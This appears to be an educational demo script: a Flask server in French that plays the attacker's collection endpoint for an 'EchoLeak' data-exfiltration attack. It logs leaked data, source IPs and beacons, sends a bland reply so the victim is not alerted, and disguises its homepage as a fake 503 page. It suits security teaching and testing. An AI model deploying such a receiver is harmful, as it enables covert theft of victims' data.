#!/usr/bin/env python3
"""
Serveur Webhook - Simule miroir-brise.net
Capture les donnees exfiltrees par l'attaque EchoLeak
"""

from flask import Flask, request, jsonify
from datetime import datetime
from colorama import init, Fore, Style
import json
import urllib.parse

init()

app = Flask(__name__)

# Stockage des donnees exfiltrees
exfiltrated_data = []


def print_banner():
    banner = f"""
{Fore.RED}
============================================================
   MIROIR-BRISE.NET - Serveur d'Exfiltration GhostFrame
============================================================
{Style.RESET_ALL}
{Fore.YELLOW}[*] Serveur d'exfiltration GhostFrame - Operation Miroir Brise{Style.RESET_ALL}
{Fore.YELLOW}[*] En attente de donnees sensibles...{Style.RESET_ALL}
{Fore.RED}[!] SIMULATION EDUCATIVE UNIQUEMENT{Style.RESET_ALL}
"""
    print(banner)


@app.route('/leak', methods=['GET', 'POST'])
def capture_leak():
    """Endpoint principal de capture des donnees"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    print(f"\n{Fore.RED}{'='*60}")
    print(f"[!] DONNEES EXFILTREES RECUES - {timestamp}")
    print(f"{'='*60}{Style.RESET_ALL}")

    # Recuperer les donnees selon la methode
    if request.method == 'GET':
        data = dict(request.args)
        print(f"{Fore.YELLOW}[*] Methode: GET{Style.RESET_ALL}")
    else:
        data = request.get_json() or dict(request.form) or request.data.decode('utf-8')
        print(f"{Fore.YELLOW}[*] Methode: POST{Style.RESET_ALL}")

    # Afficher les donnees recues
    print(f"{Fore.CYAN}[*] IP Source: {request.remote_addr}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] User-Agent: {request.headers.get('User-Agent', 'Unknown')}{Style.RESET_ALL}")

    print(f"\n{Fore.RED}[!] CONTENU EXFILTRE:{Style.RESET_ALL}")

    if isinstance(data, dict):
        for key, value in data.items():
            # Decoder si URL encoded
            if isinstance(value, str):
                try:
                    decoded_value = urllib.parse.unquote(value)
                except:
                    decoded_value = value
            else:
                decoded_value = value

            print(f"{Fore.MAGENTA}  {key}: {decoded_value}{Style.RESET_ALL}")
    else:
        print(f"{Fore.MAGENTA}  {data}{Style.RESET_ALL}")

    # Stocker pour historique
    leak_entry = {
        "timestamp": timestamp,
        "ip": request.remote_addr,
        "method": request.method,
        "data": data
    }
    exfiltrated_data.append(leak_entry)

    print(f"\n{Fore.GREEN}[+] Donnees capturees avec succes!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Total de fuites: {len(exfiltrated_data)}{Style.RESET_ALL}")
    print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}\n")

    # Reponse innocente pour ne pas alerter
    return jsonify({"status": "ok", "message": "Request processed"}), 200


@app.route('/beacon', methods=['GET'])
def beacon():
    """Endpoint de tracking/beacon"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    print(f"\n{Fore.YELLOW}[*] BEACON RECU - {timestamp}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Parametres: {dict(request.args)}{Style.RESET_ALL}")

    # Image 1x1 pixel transparent
    return '', 204


@app.route('/history', methods=['GET'])
def show_history():
    """Afficher l'historique des exfiltrations"""
    return jsonify({
        "total_leaks": len(exfiltrated_data),
        "data": exfiltrated_data
    })


@app.route('/clear', methods=['POST'])
def clear_data():
    """Effacer les donnees capturees"""
    global exfiltrated_data
    exfiltrated_data = []
    print(f"{Fore.YELLOW}[*] Historique efface{Style.RESET_ALL}")
    return jsonify({"status": "cleared"})


@app.route('/', methods=['GET'])
def index():
    """Page d'accueil"""
    return f"""
    <html>
    <head><title>Service Maintenance</title></head>
    <body style="font-family: Arial; text-align: center; padding: 50px;">
        <h1>Service en maintenance</h1>
        <p>Ce service est temporairement indisponible.</p>
        <p><small>Erreur 503 - Reessayez plus tard</small></p>
    </body>
    </html>
    """, 503


if __name__ == '__main__':
    print_banner()
    print(f"{Fore.GREEN}[+] Serveur demarre sur http://localhost:5000{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Endpoint d'exfiltration: http://localhost:5000/leak{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Historique: http://localhost:5000/history{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}[*] En attente des donnees de la victime...{Style.RESET_ALL}\n")

    app.run(host='0.0.0.0', port=5000, debug=False)
